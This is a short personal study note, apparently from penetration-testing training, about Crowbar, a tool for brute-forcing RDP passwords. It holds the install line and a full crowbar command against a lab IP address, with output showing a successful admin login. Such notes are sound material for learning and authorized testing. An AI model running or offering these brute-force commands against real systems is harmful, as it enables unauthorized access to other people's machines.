---
creation date: December 19th 2022
last modified date: December 19th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Crowbar]]  
___

## Description:  

one of the few tools that can reliably and efficiently perform password attacks against the Windows Remote Desktop Protocol (RDP) service on modern versions of Windows

```
sudo apt install crowbar
```

To invoke crowbar, we will specify the protocol (-b), the target server (-s), a username (-u), a 
wordlist (-C), and the number of threads (-n)
```
crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1

2019-08-16 04:51:12 START 2019-08-16 04:51:12 Crowbar v0.3.5-dev 
2019-08-16 04:51:12 Trying 10.11.0.22:3389 
2019-08-16 04:51:13 RDP-SUCCESS : 10.11.0.22:3389 - admin:Offsec! 
2019-08-16 04:51:13 STOP L
```


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: December 19th 2022 (09:25 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
